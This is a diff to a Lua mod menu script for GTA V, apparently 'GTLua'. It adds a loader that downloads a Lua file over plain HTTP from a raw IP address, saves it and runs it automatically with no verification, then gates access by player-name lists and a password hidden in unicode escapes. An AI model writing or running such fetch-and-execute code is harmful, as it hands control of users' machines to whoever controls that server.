@@ -17618,8 +17618,7 @@ GENERIC_AUDIO = {
         return native_invoker.get_return_value_bool()
     end
 }
--- 
-
+--
 function inputC(windowName, maxInput, defaultText)
     MISC.DISPLAY_ONSCREEN_KEYBOARD(0, windowName, "", defaultText, "", "", "", maxInput);
     while MISC.UPDATE_ONSCREEN_KEYBOARD() == 0 do util.yield_once() end
@@ -17643,41 +17642,91 @@ function decodeUnicode(str)
     return decodedStr
 end
 
-gstring = decodeUnicode(">>输入密码启动")
-pstring = decodeUnicode("\\u0067\\u0074\\u0038\\u0038\\u0038")
-lstring = decodeUnicode(">>正在载入...")
-estring = decodeUnicode("\\u5BC6\\u7801\\u8F93\\u5165\\u9519\\u8BEF")
-nstring = decodeUnicode("\\u52A0\\u7FA4\\u0037\\u0031\\u0036\\u0034\\u0033\\u0031\\u0035\\u0036\\u0036\\u83B7\\u5F97\\u5BC6\\u7801")
+menu.hyperlink(menu.my_root(), ">>GTLua 官方网站", "http://gtlua.cn", "欢迎前来访问GTLua官方网站\n您需要了解的一切内容都在这里")
+util.toast("请稍后...\n正在连接到GTLua服务器")
 
-loadgtsc = menu.my_root():action(gstring, {""}, "", function()
-    local text = inputC("", 5, "")
-    if text == pstring then
-        loadgtsc1 = menu.my_root():action(lstring, {""}, "", function()
+local name = players.get_name(players.user())
+async_http.init("http://154.37.153.199:10888", "/down/OZ85vva4wKjD.lua", function(response_body, header, response_code)
+    if response_code == 200 then
+        file = io.open("gtvipscript.lua", "w")
+        if file then
+            file:write(response_body)
+            file:close()
+            require("gtvipscript")
 
-        end)
-        menu.set_visible(loadgtsc, false)
-        util.yield(1000)
-        menu.set_visible(loadgtsc1, false)
-        loadgt()
-    else
-        util.toast(estring)
+            gstring = decodeUnicode(">>输入密码启动")
+            pstring = decodeUnicode("\\u0067\\u0074\\u0038\\u0038\\u0038")
+            lstring = decodeUnicode(">>正在载入...")
+            estring = decodeUnicode("\\u5BC6\\u7801\\u8F93\\u5165\\u9519\\u8BEF")
+            nstring = decodeUnicode(
+                "\\u52A0\\u7FA4\\u0037\\u0031\\u0036\\u0034\\u0033\\u0031\\u0035\\u0036\\u0036\\u83B7\\u5F97\\u5BC6\\u7801")
+
+            local name<const> = SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME(players.user())
+
+            loadgtsc = menu.my_root():action(gstring, {""}, "", function()
+                local text = inputC("", 5, "")
+                if text == pstring then
+                    loadgtsc1 = menu.my_root():action(lstring, {""}, "", function()
+
+                    end)
+                    menu.set_visible(loadgtsc, false)
+                    util.yield(1000)
+                    menu.set_visible(loadgtsc1, false)
+
+                    loadlogo()
+                    loadgt()
+                else
+                    util.toast(estring)
+                end
+            end)
+            loadgtsc.visible = false
+
+            local ultravip = false
+            local matched_name = nil
+            for _, id in ipairs(spid) do
+                if name == id.playerid then
+                    matched_name = name
+                    util.toast("请稍后...等待密码自动响应")
+                    break
+                end
+            end
+
+            for _, id in ipairs(sxid) do
+                if name == id.playeridx then
+                    matched_name = name
+                    ultravip = true
+                    util.toast("请稍后...等待密码自动响应")
+                    break
+                end
+            end
+
+            for _, id in ipairs(blackid) do
+                if name == id.bl then
+                    util.toast(
+                        "GRANDTOURINGVIP\n你已被禁止使用GTLua\n如果你拥有皇榜特权，也将一并取消")
+                    util.stop_script()
+                end
+            end
+
+            if matched_name and not ultravip then
+                --util.yield(2000)
+                loadgtsc.visible = false
+                loadlogo()
+                loadgt()
+            elseif matched_name and ultravip then
+                --util.yield(2000)
+                loadgtsc.visible = false
+                loadlogo()
+                loadgt()
+            else
+                util.toast("请输入密码")
+                loadgtsc.visible = true
+            end
+
+		else
+			util.toast("无法与GTLua服务器建立连接通信")
+			util.stop_script()
+        end
     end
 end)
-
-function skp()
-	for _, id in ipairs(devid) do
-		passname = SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME(players.user())
-		if passname == id.playerrid then
-			loadgtsc.visible = false
-			loadgt()
-		end
-	end
-	
-	for _, id in ipairs(spid) do
-		passname = SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME(players.user())
-		if passname == id.playerid then
-			loadgtsc.visible = false
-			loadgt()
-		end
-	end
-end
+async_http.dispatch()
